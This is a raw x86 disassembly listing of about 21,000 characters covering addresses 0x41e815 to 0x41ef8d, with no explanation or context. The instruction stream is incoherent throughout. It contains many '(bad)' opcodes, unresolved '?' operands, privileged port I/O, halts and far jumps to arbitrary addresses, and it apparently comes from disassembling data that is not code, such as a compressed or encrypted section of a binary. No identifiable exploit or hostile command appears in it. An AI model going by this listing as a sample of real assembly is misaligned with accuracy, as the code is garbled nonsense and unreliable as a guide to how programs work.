  41e815:	test   al,0xb0
  41e817:	ss int 0xbf
  41e81a:	jno    0x41e899
  41e81c:	inc    edx
  41e81d:	imul   ecx,DWORD PTR [edx-0x56],0xd017d128
  41e824:	pop    eax
  41e825:	cmp    DWORD PTR [edi],esp
  41e827:	in     al,0xc
  41e829:	lods   eax,DWORD PTR ds:[esi]
  41e82a:	into   
  41e82b:	xchg   BYTE PTR [edx],al
  41e82d:	mov    ?,edi
  41e82f:	in     al,dx
  41e830:	stos   DWORD PTR es:[edi],eax
  41e831:	jne    0x41e849
  41e833:	adc    DWORD PTR [edi-0x7d14b0a],ecx
  41e839:	pop    eax
  41e83a:	push   ss
  41e83b:	inc    edx
  41e83c:	daa    
  41e83d:	xor    al,dh
  41e83f:	xchg   edi,eax
  41e840:	mov    fs,WORD PTR [ecx-0x40cd6b31]
  41e846:	ins    DWORD PTR es:[edi],dx
  41e847:	scas   eax,DWORD PTR es:[edi]
  41e848:	mov    al,0x1d
  41e84a:	shl    BYTE PTR [edi],0xf5
  41e84d:	xor    bh,BYTE PTR ds:[ebp+0x318c0b92]
  41e854:	add    DWORD PTR ds:0xad499527,0x6c
  41e85b:	pushf  
  41e85c:	inc    esi
  41e85d:	or     edi,ebp
  41e85f:	icebp  
  41e860:	dec    ecx
  41e861:	mov    eax,0x8eb12526
  41e866:	sahf   
  41e867:	retf   
  41e868:	fistp  DWORD PTR [ebx-0x43]
  41e86b:	test   BYTE PTR [esi+0x6bd6cd3f],cl
  41e871:	push   0xfc1d8882
  41e876:	addr16 pushf 
  41e878:	shr    BYTE PTR [eax-0x10],0x87
  41e87c:	mov    al,0x43
  41e87e:	mov    ds:0x84a1b41e,al
  41e883:	or     BYTE PTR [ecx+0x6aecb864],dh
  41e889:	sub    edx,DWORD PTR [ebx+0x7744466d]
  41e88f:	lahf   
  41e890:	fucomip st,st(7)
  41e892:	out    0x66,al
  41e894:	push   esi
  41e895:	in     al,dx
  41e896:	loope  0x41e824
  41e898:	daa    
  41e899:	or     DWORD PTR [ebx+0x37d3161f],esp
  41e89f:	mov    esp,edi
  41e8a1:	cmp    al,0x20
  41e8a3:	pop    esp
  41e8a4:	jl     0x41e8b2
  41e8a6:	mov    eax,ds:0x27add3e0
  41e8ab:	dec    eax
  41e8ac:	dec    ebp
  41e8ad:	sti    
  41e8ae:	dec    ecx
  41e8af:	push   0xffffffb6
  41e8b1:	leave  
  41e8b2:	jecxz  0x41e857
  41e8b4:	xor    DWORD PTR [edx+0x3b9e875b],0x734673ba
  41e8be:	shl    DWORD PTR [ecx],0xf1
  41e8c1:	sub    eax,DWORD PTR [ebx-0x42]
  41e8c4:	loop   0x41e88b
  41e8c6:	outs   dx,DWORD PTR ds:[esi]
  41e8c7:	jecxz  0x41e8ed
  41e8c9:	stos   BYTE PTR es:[edi],al
  41e8ca:	and    DWORD PTR [edx],esp
  41e8cc:	jb     0x41e86d
  41e8ce:	push   0x1a41c2f
  41e8d3:	clc    
  41e8d4:	dec    ebp
  41e8d5:	aaa    
  41e8d6:	add    cl,BYTE PTR [eax]
  41e8d8:	lods   al,BYTE PTR ds:[esi]
  41e8d9:	in     eax,dx
  41e8da:	add    dh,bl
  41e8dc:	leave  
  41e8dd:	mov    dh,0xfa
  41e8df:	add    al,0xe9
  41e8e1:	jge    0x41e949
  41e8e3:	test   ah,al
  41e8e5:	xor    al,0xc3
  41e8e7:	lods   eax,DWORD PTR ds:[esi]
  41e8e8:	push   ss
  41e8e9:	push   cs
  41e8ea:	adc    ch,dh
  41e8ec:	mov    cl,0x55
  41e8ee:	std    
  41e8ef:	aaa    
  41e8f0:	mov    esp,0xbd1ae376
  41e8f5:	jle    0x41e8eb
  41e8f7:	pop    edx
  41e8f8:	and    eax,0x1224672c
  41e8fd:	or     edx,0xa56eddcb
  41e903:	sbb    DWORD PTR [ebp+0x27b5273f],esi
  41e909:	test   edx,0x8197d9af
  41e90f:	setle  bh
  41e912:	sbb    DWORD PTR ds:[edi-0x2b5177c9],ebp
  41e919:	push   ebp
  41e91a:	aas    
  41e91b:	dec    ebp
  41e91c:	inc    DWORD PTR [ebx+0x7c]
  41e91f:	mov    edx,edi
  41e921:	cmp    bh,0x66
  41e924:	cmp    edx,DWORD PTR [ebx+0x117eb215]
  41e92a:	mov    ds:0xdf280997,eax
  41e92f:	add    esi,esp
  41e931:	and    al,0xa8
  41e933:	cmp    al,0x59
  41e935:	dec    esi
  41e936:	shr    BYTE PTR [edi],0x58
  41e939:	(bad)  
  41e93a:	ficom  WORD PTR [esi+0x4a]
  41e93d:	out    dx,al
  41e93e:	iret   
  41e93f:	arpl   WORD PTR [ebp+0x2c0bf3d3],bp
  41e945:	bnd jnp 0x41e901
  41e948:	push   esp
  41e949:	in     al,dx
  41e94a:	add    eax,DWORD PTR [ebp+0x1ec2c]
  41e950:	mov    ds:0xb79d96d,al
  41e955:	lock pmaxub mm6,QWORD PTR [ecx+0x2]
  41e95a:	push   es
  41e95b:	dec    edx
  41e95c:	test   BYTE PTR cs:[ebx+0x33],ch
  41e960:	xchg   edx,eax
  41e961:	xor    ah,BYTE PTR [ebp+0x19364337]
  41e967:	lahf   
  41e968:	dec    esp
  41e969:	(bad)  
  41e96a:	push   edi
  41e96b:	cld    
  41e96c:	cmp    WORD PTR [ebx],di
  41e96f:	sbb    BYTE PTR [edx+0x47c42c9d],ah
  41e975:	addr16 mov ch,0x43
  41e978:	in     eax,0x60
  41e97a:	pusha  
  41e97b:	mov    dl,0xed
  41e97d:	mov    ds:0x89bcc6a5,eax
  41e982:	test   al,0xcc
  41e984:	loop   0x41e9f4
  41e986:	push   ecx
  41e987:	add    ah,BYTE PTR [edi]
  41e989:	ins    DWORD PTR es:[edi],dx
  41e98a:	stc    
  41e98b:	jecxz  0x41e928
  41e98d:	or     ch,bl
  41e98f:	sub    BYTE PTR [edx+0x79],bh
  41e992:	mov    eax,0x3db80a07
  41e997:	inc    esp
  41e998:	mov    esi,0x639c9fb
  41e99d:	sub    edi,0xdf011883
  41e9a3:	pop    ebp
  41e9a4:	sbb    cl,bl
  41e9a6:	cmp    ebp,edx
  41e9a8:	mov    edx,0xb6b197b3
  41e9ad:	sub    esp,DWORD PTR [ebx+0x52]
  41e9b0:	imul   ecx,DWORD PTR [ebx],0x15
  41e9b3:	(bad)  
  41e9b4:	cdq    
  41e9b5:	adc    dh,dh
  41e9b7:	pop    es
  41e9b8:	jle    0x41e9a0
  41e9ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9bb:	shl    dh,0xd2
  41e9be:	pop    esi
  41e9bf:	add    DWORD PTR [ebp+0x39dacdfb],ebx
  41e9c5:	aas    
  41e9c6:	jge    0x41ea0a
  41e9c8:	and    ecx,DWORD PTR [edi-0x46d84abd]
  41e9ce:	adc    bh,BYTE PTR [eax-0x5d90868b]
  41e9d4:	mov    edi,?
  41e9d6:	(bad)  
  41e9d7:	pop    ebp
  41e9d8:	cmp    edi,0x14f486f8
  41e9de:	pop    esp
  41e9df:	cld    
  41e9e0:	jge    0x41e973
  41e9e2:	add    eax,0x39d079a2
  41e9e7:	inc    eax
  41e9e8:	mul    edx
  41e9ea:	adc    DWORD PTR [eax+ecx*8-0xd3cf5ad],esi
  41e9f1:	mov    esp,0x312b5d5c
  41e9f6:	les    esi,FWORD PTR [ebx]
  41e9f8:	push   ds
  41e9f9:	fcmovbe st,st(2)
  41e9fb:	dec    edi
  41e9fc:	call   0xc9c4f607
  41ea01:	sub    DWORD PTR [eax-0x465f02c2],esi
  41ea07:	call   0xfb671ebf
  41ea0c:	aam    0x76
  41ea0e:	adc    DWORD PTR [ebx+ebx*2+0x9],edi
  41ea12:	out    dx,al
  41ea13:	repz mov ebx,0xcb74fbd6
  41ea19:	out    dx,al
  41ea1a:	fisubr WORD PTR [ebp-0x6848affa]
  41ea20:	inc    edx
  41ea21:	jle    0x41e9e4
  41ea23:	cmp    al,0xba
  41ea25:	(bad)  
  41ea26:	into   
  41ea27:	dec    esi
  41ea28:	pop    esi
  41ea29:	int    0xc9
  41ea2b:	mov    al,dl
  41ea2d:	pop    ebp
  41ea2e:	push   edi
  41ea2f:	xor    eax,0x5ba429fa
  41ea34:	test   cl,ch
  41ea36:	xchg   ecx,eax
  41ea37:	jne    0x41e9c6
  41ea39:	imul   ebx,DWORD PTR [ecx-0x3d78c2bd],0x73
  41ea40:	ss in  eax,0xa5
  41ea43:	fisttp DWORD PTR [edx-0x185c7648]
  41ea49:	imul   ebp,edi,0x9dea2ffe
  41ea4f:	fbld   TBYTE PTR [edi-0xa]
  41ea52:	adc    BYTE PTR [eax+0x15e07c8b],al
  41ea58:	cmp    BYTE PTR [esp+edi*1-0x7481023f],al
  41ea5f:	sbb    DWORD PTR [edi-0x4d],0x44
  41ea63:	add    bl,BYTE PTR [ecx-0x3ee23983]
  41ea69:	mov    edi,0x43166c3a
  41ea6e:	scas   al,BYTE PTR es:[edi]
  41ea6f:	jae    0x41ea23
  41ea71:	jb     0x41eacf
  41ea73:	loope  0x41ea03
  41ea75:	xchg   DWORD PTR [edx-0x46],ebp
  41ea78:	mov    ebx,0x282eea3d
  41ea7d:	loopne 0x41ea1c
  41ea7f:	ret    
  41ea80:	sar    BYTE PTR cs:[edx],0x61
  41ea84:	idiv   DWORD PTR [edx+0x1264dae4]
  41ea8a:	test   DWORD PTR [ebx],ecx
  41ea8c:	(bad)  
  41ea8d:	xor    eax,0x4aa48436
  41ea92:	arpl   WORD PTR [eax-0x54],dx
  41ea95:	ds jl  0x41ea33
  41ea98:	sahf   
  41ea99:	mov    ebp,0xb8098b97
  41ea9e:	cmp    eax,0xb454564
  41eaa3:	mov    edx,0x4f40738f
  41eaa8:	data16 sar dh,1
  41eaab:	(bad)  
  41eaad:	xchg   edx,edx
  41eaaf:	mov    es,WORD PTR [ebx+0x62]
  41eab2:	call   DWORD PTR [ecx]
  41eab4:	repz fstp TBYTE PTR [ebp+0x63]
  41eab8:	xchg   edx,eax
  41eab9:	leave  
  41eaba:	fldenv [edx-0x2a]
  41eabd:	xor    esi,DWORD PTR [ebp+0x6d]
  41eac0:	cld    
  41eac1:	add    eax,0x6aeb171b
  41eac6:	sbb    BYTE PTR [edi-0x4a],dl
  41eac9:	pop    ecx
  41eaca:	xor    bl,BYTE PTR [eax]
  41eacc:	and    DWORD PTR [eax],ecx
  41eace:	rcr    DWORD PTR [edx-0x26],1
  41ead1:	je     0x41ea74
  41ead3:	(bad)  
  41ead4:	or     eax,0xf67cfc9e
  41ead9:	ja     0x41ead3
  41eadb:	outs   dx,BYTE PTR ds:[esi]
  41eadc:	dec    ebx
  41eadd:	fidiv  WORD PTR [ebx]
  41eadf:	inc    ebp
  41eae0:	pop    es
  41eae1:	xchg   ebp,eax
  41eae2:	push   cs
  41eae3:	mul    ah
  41eae5:	jo     0x41eadc
  41eae7:	cmp    al,0xde
  41eae9:	mov    dh,0x46
  41eaeb:	adc    al,0xcb
  41eaed:	rcr    BYTE PTR [edi-0x287622d7],cl
  41eaf3:	xor    al,0x29
  41eaf5:	adc    esp,ebx
  41eaf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaf8:	je     0x41eaf5
  41eafa:	sbb    ebx,DWORD PTR [edx+0x21adca7]
  41eb00:	or     esi,DWORD PTR [ebx-0x7f6c89eb]
  41eb06:	in     eax,dx
  41eb07:	(bad)  
  41eb08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb09:	cmp    edx,DWORD PTR [ebp+0x7ce4d84a]
  41eb0f:	popa   
  41eb10:	xor    eax,0x721ce2d1
  41eb15:	mov    esp,0x70f87490
  41eb1a:	and    ebx,DWORD PTR [ecx+esi*1]
  41eb1d:	ins    BYTE PTR es:[edi],dx
  41eb1e:	sbb    BYTE PTR [ebx+0x2d09fa45],bh
  41eb24:	dec    BYTE PTR [edx-0x6d]
  41eb27:	(bad)  
  41eb28:	cmp    eax,0xee0368d2
  41eb2d:	sbb    eax,0x7352c8e4
  41eb32:	bound  esi,QWORD PTR [ebx+0x39]
  41eb35:	int    0x34
  41eb37:	adc    bl,BYTE PTR [eax+ebx*8+0x35]
  41eb3b:	cmp    eax,0x867595b6
  41eb40:	adc    BYTE PTR [edx-0x3],dl
  41eb43:	out    0x78,al
  41eb45:	test   eax,0x77ebb2ef
  41eb4a:	xchg   edi,eax
  41eb4b:	sbb    edi,ebp
  41eb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb4e:	fld    TBYTE PTR ds:0x9252bc72
  41eb54:	les    edi,FWORD PTR [edx]
  41eb56:	dec    ebp
  41eb57:	pop    ebp
  41eb58:	mov    gs,WORD PTR [ecx+0x7712ae2a]
  41eb5e:	popf   
  41eb5f:	ja     0x41eb7a
  41eb61:	mov    ds:0xc5b1947b,eax
  41eb66:	arpl   WORD PTR [edi],bp
  41eb68:	mov    bh,0x1e
  41eb6a:	add    al,0xf4
  41eb6c:	lods   al,BYTE PTR ds:[esi]
  41eb6d:	clc    
  41eb6e:	sbb    dl,ch
  41eb70:	xor    DWORD PTR [edi+edx*2],esi
  41eb73:	bound  esi,QWORD PTR [ebp-0x16]
  41eb76:	or     eax,0x2e3375ae
  41eb7b:	or     al,0xde
  41eb7d:	loope  0x41eb10
  41eb7f:	add    DWORD PTR [eax+ebp*8+0x61200f7e],eax
  41eb86:	int3   
  41eb87:	jns    0x41eb0e
  41eb89:	shr    BYTE PTR [eax-0x48],0x93
  41eb8d:	inc    esp
  41eb8e:	inc    edx
  41eb8f:	adc    cl,BYTE PTR [edx]
  41eb91:	outs   dx,DWORD PTR ds:[esi]
  41eb92:	adc    BYTE PTR [eax],dl
  41eb94:	and    al,0x50
  41eb96:	mov    ebp,0x61e70e5b
  41eb9b:	call   0x9b21549c
  41eba0:	sub    al,0x3d
  41eba2:	jg     0x41eb24
  41eba4:	dec    edx
  41eba5:	pop    esp
  41eba6:	push   edx
  41eba7:	xchg   edi,eax
  41eba8:	xor    eax,0xb96e4381
  41ebad:	mov    dh,0xf5
  41ebaf:	sbb    DWORD PTR [ebx],0x74
  41ebb2:	clc    
  41ebb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebb4:	lea    ebx,[ebx-0x14]
  41ebb7:	jecxz  0x41eb7b
  41ebb9:	jae    0x41eb3f
  41ebbb:	xchg   esp,eax
  41ebbc:	loop   0x41eba5
  41ebbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebbf:	jp     0x41ebe1
  41ebc1:	(bad)  
  41ebc2:	out    0x9,eax
  41ebc4:	cmp    al,0x2b
  41ebc6:	add    esp,DWORD PTR [edx-0x3a]
  41ebc9:	adc    esp,ebx
  41ebcb:	xlat   BYTE PTR ds:[ebx]
  41ebcc:	mov    esi,0xb1b9b57e
  41ebd1:	fnsave [ebx-0x42]
  41ebd4:	jle    0x41ec20
  41ebd6:	pop    es
  41ebd7:	ins    DWORD PTR es:[edi],dx
  41ebd8:	repnz ss xchg ebp,eax
  41ebdb:	jmp    0x4e46:0x4d435462
  41ebe2:	test   eax,0xecd44ed8
  41ebe7:	std    
  41ebe8:	jo     0x41ebf4
  41ebea:	fsubr  DWORD PTR [edx+0x71]
  41ebed:	loopne 0x41ebc4
  41ebef:	push   esi
  41ebf0:	lods   al,BYTE PTR ds:[esi]
  41ebf1:	stos   DWORD PTR es:[edi],eax
  41ebf2:	jbe    0x41eb74
  41ebf4:	les    eax,FWORD PTR [ebx+0x2e]
  41ebf7:	mov    eax,0xa1dd1151
  41ebfc:	fsubr  DWORD PTR [ecx+eiz*2]
  41ebff:	in     al,0x16
  41ec01:	ja     0x41ebae
  41ec03:	shl    DWORD PTR [eax+0x44e5d051],cl
  41ec09:	out    0xf9,eax
  41ec0b:	(bad)  
  41ec0c:	jns    0x41ebcd
  41ec0e:	xlat   BYTE PTR ds:[ebx]
  41ec0f:	and    al,0xf3
  41ec11:	test   eax,0x4fa0f6aa
  41ec16:	enter  0xb950,0x2a
  41ec1a:	fild   QWORD PTR cs:[esi]
  41ec1d:	and    al,0x27
  41ec1f:	aas    
  41ec20:	pop    ds
  41ec21:	jge    0x41ec65
  41ec23:	xchg   ebx,eax
  41ec24:	jmp    0x3dc83959
  41ec29:	lods   al,BYTE PTR ds:[esi]
  41ec2a:	cmp    ch,BYTE PTR [ebx-0x6bb94314]
  41ec30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec31:	mov    dl,0x96
  41ec33:	adc    BYTE PTR [edi+0x228038fa],cl
  41ec39:	inc    ecx
  41ec3a:	xlat   BYTE PTR ds:[ebx]
  41ec3b:	xor    al,0xfa
  41ec3d:	cli    
  41ec3e:	cmp    al,0x59
  41ec40:	and    BYTE PTR [ecx+0x46c9730f],cl
  41ec46:	jp     0x41ebd6
  41ec48:	pop    esi
  41ec49:	add    esi,esi
  41ec4b:	sub    DWORD PTR [ecx-0x206ca84],esp
  41ec51:	inc    esi
  41ec52:	pop    ebx
  41ec53:	or     al,0xe8
  41ec55:	jo     0x41ec13
  41ec57:	stos   BYTE PTR es:[edi],al
  41ec58:	call   0x9b38:0x9bf95a47
  41ec5f:	cmp    dh,BYTE PTR [ebx+0x6b45bef7]
  41ec65:	dec    edi
  41ec66:	aam    0xb2
  41ec68:	xlat   BYTE PTR ds:[ebx]
  41ec69:	push   ss
  41ec6a:	add    al,bh
  41ec6c:	push   ebp
  41ec6d:	mov    edx,0x3766ef8e
  41ec72:	dec    edx
  41ec73:	rol    DWORD PTR [esp+edi*4],1
  41ec76:	fdiv   st,st(0)
  41ec78:	bound  edx,QWORD PTR [ecx]
  41ec7a:	inc    ebp
  41ec7b:	jb     0x41ec35
  41ec7d:	pop    esi
  41ec7e:	push   cs
  41ec7f:	inc    eax
  41ec80:	xchg   esp,eax
  41ec81:	test   ebp,edx
  41ec83:	adc    al,0xe7
  41ec85:	cs (bad) 
  41ec87:	or     eax,0x504128d4
  41ec8c:	xor    DWORD PTR [esi],esi
  41ec8e:	sub    DWORD PTR [ebx],ecx
  41ec90:	sub    BYTE PTR [edi+0x7a],0x4e
  41ec94:	mov    ecx,0xb7811d88
  41ec99:	hlt    
  41ec9a:	mov    al,BYTE PTR ds:0xa2caf8a3
  41eca0:	mov    edx,fs
  41eca2:	push   edx
  41eca3:	push   ebx
  41eca4:	cmp    DWORD PTR [edi+0x31],ebx
  41eca7:	sub    edi,DWORD PTR [esi+0x3295586]
  41ecad:	xchg   ecx,eax
  41ecae:	jne    0x41ec74
  41ecb0:	test   bl,ch
  41ecb2:	jb     0x41ecbe
  41ecb4:	inc    ebx
  41ecb5:	(bad)  
  41ecb6:	pop    edi
  41ecb7:	std    
  41ecb8:	inc    ebp
  41ecb9:	push   ebp
  41ecba:	sbb    DWORD PTR [edx+0x26],ecx
  41ecbd:	mov    bl,0x51
  41ecbf:	sar    DWORD PTR ds:0x23921dbd,0x36
  41ecc6:	je     0x41ecc6
  41ecc8:	jmp    0xd6a6:0x1628a488
  41eccf:	jae    0x41ed21
  41ecd1:	sbb    BYTE PTR [eax-0x2a],bh
  41ecd4:	dec    ebp
  41ecd5:	test   BYTE PTR [ebx-0x3],bh
  41ecd8:	cmp    esp,DWORD PTR [edi]
  41ecda:	xchg   esi,eax
  41ecdb:	imul   ebp,DWORD PTR [ebx-0x21455a98],0x9d560ba1
  41ece5:	jp     0x41ed10
  41ece7:	adc    ecx,ecx
  41ece9:	jmp    0x3c6f7126
  41ecee:	fistp  WORD PTR [ebp-0x4cc4009e]
  41ecf4:	push   0x6
  41ecf6:	mov    bh,0x33
  41ecf8:	imul   DWORD PTR [ebp+edi*2-0x29]
  41ecfc:	sahf   
  41ecfd:	jle    0x41ed47
  41ecff:	jg     0x41ecdb
  41ed01:	mov    bl,0xbb
  41ed03:	repz rol BYTE PTR [esi+0x26],cl
  41ed07:	test   DWORD PTR [esi+eax*1+0x104bb094],esp
  41ed0e:	fcmovb st,st(2)
  41ed10:	stos   BYTE PTR es:[edi],al
  41ed11:	sbb    ah,BYTE PTR [edx+ecx*8]
  41ed14:	mov    esi,0x33ccec32
  41ed19:	call   0x308bd074
  41ed1e:	or     al,0xaf
  41ed20:	dec    esi
  41ed21:	mov    dl,0x55
  41ed23:	in     eax,0x8
  41ed25:	shl    dl,0xe4
  41ed28:	and    eax,DWORD PTR [eax-0x6c]
  41ed2b:	xlat   BYTE PTR ds:[ebx]
  41ed2c:	mov    cl,0xbd
  41ed2e:	inc    ecx
  41ed2f:	mov    esp,0xb79f3fc5
  41ed34:	fwait
  41ed35:	jnp    0x41ed94
  41ed37:	inc    ecx
  41ed38:	mov    ah,0x8
  41ed3a:	pop    es
  41ed3b:	stos   DWORD PTR es:[edi],eax
  41ed3c:	das    
  41ed3d:	mov    bh,0xad
  41ed3f:	xlat   BYTE PTR ds:[ebx]
  41ed40:	xchg   ebp,eax
  41ed41:	dec    ecx
  41ed42:	jp     0x41ed72
  41ed44:	pushf  
  41ed45:	push   ss
  41ed46:	iret   
  41ed47:	adc    al,0xa5
  41ed49:	repz inc edi
  41ed4b:	outs   dx,DWORD PTR ds:[esi]
  41ed4c:	mov    ebx,0xb470a605
  41ed51:	fst    DWORD PTR [edi+0xbfb2e91]
  41ed57:	sbb    BYTE PTR [eax+0x7ee06d8b],0xed
  41ed5e:	dec    esi
  41ed5f:	fcomp  DWORD PTR [ebx+0x77]
  41ed62:	cli    
  41ed63:	mov    ah,0xe8
  41ed65:	popa   
  41ed66:	push   edi
  41ed67:	popf   
  41ed68:	ins    DWORD PTR es:[edi],dx
  41ed69:	pop    ebx
  41ed6a:	and    BYTE PTR [edx+0x3e],0x3f
  41ed6e:	sahf   
  41ed6f:	imul   esp,esi,0x7fc3e077
  41ed75:	adc    BYTE PTR [ecx+ebx*2+0x4e7ffd34],al
  41ed7c:	(bad)  [ebx+0x64]
  41ed7f:	iret   
  41ed80:	pop    edi
  41ed81:	push   ds
  41ed82:	sbb    BYTE PTR [ebx],ch
  41ed84:	lock (bad) 
  41ed86:	sti    
  41ed87:	mov    bh,0x43
  41ed89:	aas    
  41ed8a:	jle    0x41ed4d
  41ed8c:	iret   
  41ed8d:	mov    ah,0xb
  41ed8f:	stos   BYTE PTR es:[edi],al
  41ed90:	bound  esi,QWORD PTR ds:[ebx+0x12]
  41ed94:	fidivr WORD PTR [ebx+0x4e5d3182]
  41ed9a:	jae    0x41ede1
  41ed9c:	test   al,0xc2
  41ed9e:	std    
  41ed9f:	add    eax,0x99abf9aa
  41eda4:	xchg   edx,eax
  41eda5:	adc    cl,BYTE PTR [ebx-0x3693eb81]
  41edab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edac:	inc    ebp
  41edad:	xchg   esp,eax
  41edae:	mov    al,0x47
  41edb0:	je     0x41ee10
  41edb2:	out    0x8d,al
  41edb4:	or     dh,BYTE PTR [eax]
  41edb6:	sub    DWORD PTR [edx+0x51411fed],eax
  41edbc:	dec    ebp
  41edbd:	fst    QWORD PTR [ecx-0x1c]
  41edc0:	mov    eax,0x50b41802
  41edc5:	out    0x68,al
  41edc7:	cmp    DWORD PTR [ebx-0x198710c],esi
  41edcd:	adc    BYTE PTR [edx-0x68],0xf5
  41edd1:	cmp    al,0xf5
  41edd3:	popf   
  41edd4:	sub    eax,0x73d1fa2c
  41edd9:	lods   eax,DWORD PTR ds:[esi]
  41edda:	popf   
  41eddb:	or     eax,0x299308c2
  41ede0:	into   
  41ede1:	or     eax,DWORD PTR [edx]
  41ede3:	mov    al,0xf2
  41ede5:	sub    al,0x1
  41ede7:	pop    edi
  41ede9:	rol    ch,0x9b
  41edec:	and    ecx,esp
  41edee:	and    al,0x3e
  41edf0:	sti    
  41edf1:	adc    ch,BYTE PTR [edi+0x37]
  41edf4:	enter  0x5513,0xb9
  41edf8:	pop    ebp
  41edf9:	mov    bl,0x82
  41edfb:	(bad)  
  41edfc:	stc    
  41edfd:	fnstsw WORD PTR [esi-0x211de465]
  41ee03:	imul   ebp,DWORD PTR [esi],0xffffffd2
  41ee06:	inc    ebp
  41ee07:	popa   
  41ee08:	mov    eax,0x3c8268f1
  41ee0d:	push   esi
  41ee0e:	cmp    eax,0xb5f835ba
  41ee13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee14:	jae    0x41ee47
  41ee16:	and    BYTE PTR [esi],cl
  41ee18:	xor    esi,edx
  41ee1a:	inc    ebx
  41ee1b:	lds    ebx,FWORD PTR [ebp-0x1702f995]
  41ee21:	adc    DWORD PTR ds:0x62de3bd4,edx
  41ee27:	sub    al,0xb9
  41ee29:	into   
  41ee2a:	pop    ecx
  41ee2b:	adc    al,0x33
  41ee2d:	jae    0x41eeab
  41ee2f:	lds    esp,FWORD PTR [eax+0x144246c7]
  41ee35:	adc    DWORD PTR [ecx-0x1155a802],eax
  41ee3b:	push   ebp
  41ee3c:	sti    
  41ee3d:	sub    eax,0xedad2fb0
  41ee42:	or     al,0x90
  41ee44:	leave  
  41ee45:	mov    esp,0xf39445a1
  41ee4a:	jmp    0xb90cd0d3
  41ee4f:	mov    cl,0xd8
  41ee51:	xor    ecx,esi
  41ee53:	add    DWORD PTR [ebp-0x10197eab],ecx
  41ee59:	mov    cl,0x17
  41ee5b:	xchg   esp,eax
  41ee5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee5d:	mov    edi,DWORD PTR [eax]
  41ee5f:	xor    eax,0x139921ba
  41ee64:	fucomi st,st(7)
  41ee66:	or     al,0xda
  41ee68:	in     al,0x15
  41ee6a:	add    BYTE PTR [ebx-0x5],dl
  41ee6d:	scas   eax,DWORD PTR es:[edi]
  41ee6e:	nop
  41ee6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee70:	nop
  41ee71:	and    DWORD PTR [ebx+0x4ba78c45],esi
  41ee77:	arpl   WORD PTR [ebx-0x35e97531],bx
  41ee7d:	jmp    0x41ee47
  41ee7f:	adc    al,0xa3
  41ee81:	sar    DWORD PTR [ebp+0x2065a40],0x22
  41ee88:	mov    cl,0xf4
  41ee8a:	dec    esp
  41ee8b:	inc    eax
  41ee8c:	xor    al,0xb1
  41ee8e:	pusha  
  41ee8f:	add    eax,0xe9f62d5c
  41ee94:	jno    0x41ee27
  41ee96:	test   al,0x2b
  41ee98:	(bad)  
  41ee99:	imul   ecx,DWORD PTR [eax-0x43184517],0x1c
  41eea0:	pop    es
  41eea1:	test   BYTE PTR [edx+0x79f1645d],0x76
  41eea8:	push   ecx
  41eea9:	retf   
  41eeaa:	pop    ecx
  41eeab:	shl    BYTE PTR [edi-0x270fff98],1
  41eeb1:	mov    dl,0x21
  41eeb3:	retf   
  41eeb4:	inc    eax
  41eeb5:	push   ebx
  41eeb6:	repnz out dx,al
  41eeb8:	xchg   BYTE PTR [ebp+0x0],bl
  41eebb:	bnd ret 
  41eebd:	ins    DWORD PTR es:[edi],dx
  41eebe:	paddsb mm0,QWORD PTR ds:0xedb0d74f
  41eec5:	lea    ebp,[esi+0x35ace790]
  41eecb:	push   0xffffff82
  41eecd:	jno    0x41eea8
  41eecf:	adc    eax,0x28b73574
  41eed4:	lock jecxz 0x41ee7d
  41eed7:	mov    ds:0x370efc6b,eax
  41eedc:	cmp    al,BYTE PTR [ebp+0x61a16b6a]
  41eee2:	pcmpeqw mm3,QWORD PTR [eax+0x5229c15a]
  41eee9:	or     BYTE PTR [edx],ah
  41eeeb:	(bad)  
  41eeec:	or     ah,bh
  41eeee:	cmp    edx,DWORD PTR [ecx*8-0x23e3e67a]
  41eef5:	xlat   BYTE PTR ds:[ebx]
  41eef6:	loope  0x41ef66
  41eef8:	xor    edx,edx
  41eefa:	test   al,0x21
  41eefc:	out    0x92,eax
  41eefe:	and    DWORD PTR [edi-0x3a],ecx
  41ef01:	cmp    al,0x7b
  41ef03:	adc    BYTE PTR ds:0x39982d4d,cl
  41ef09:	aam    0xa0
  41ef0b:	sbb    eax,0x2ee2462a
  41ef10:	pop    edx
  41ef11:	xchg   ecx,eax
  41ef12:	dec    eax
  41ef13:	shr    ah,1
  41ef15:	hlt    
  41ef16:	mov    dl,dl
  41ef18:	div    DWORD PTR [ebx+0x1b]
  41ef1b:	iret   
  41ef1c:	cmp    dl,BYTE PTR [edi+0x5f]
  41ef1f:	mov    ebp,ebp
  41ef21:	fucomip st,st(5)
  41ef23:	push   es
  41ef24:	test   eax,0xec44cb2b
  41ef29:	sub    ch,BYTE PTR ds:0x89712f0a
  41ef2f:	or     ecx,DWORD PTR [edx+0x1c]
  41ef32:	std    
  41ef33:	inc    esi
  41ef34:	sub    ch,BYTE PTR [edx+0x40]
  41ef37:	or     BYTE PTR [eax+ecx*2-0x55ade2a],cl
  41ef3e:	rcl    BYTE PTR [edx+0x268ccde5],1
  41ef44:	aad    0xe7
  41ef46:	inc    ebp
  41ef47:	call   0x2551:0x61d7dd0a
  41ef4e:	xchg   DWORD PTR [esi+edx*8+0x7ea5bf36],esi
  41ef55:	ss jl  0x41efa4
  41ef58:	lds    esp,FWORD PTR [ebp-0x155f6ee6]
  41ef5e:	ins    DWORD PTR es:[edi],dx
  41ef5f:	sti    
  41ef60:	push   esp
  41ef61:	shr    BYTE PTR [bx+0x586d],0xdb
  41ef67:	jg     0x41ef6c
  41ef69:	out    dx,eax
  41ef6a:	es and eax,0x6c867e97
  41ef70:	jnp    0x41efd9
  41ef72:	cmp    eax,0x2d210cb4
  41ef77:	mov    al,ds:0x6ce6df4a
  41ef7c:	cmp    eax,0x2d8dbd5f
  41ef81:	adc    BYTE PTR [ecx+0x4b],bh
  41ef84:	adc    eax,0xb32ff0b3
  41ef89:	sub    BYTE PTR [eax],0xd9
  41ef8c:	std    
  41ef8d:	aas    
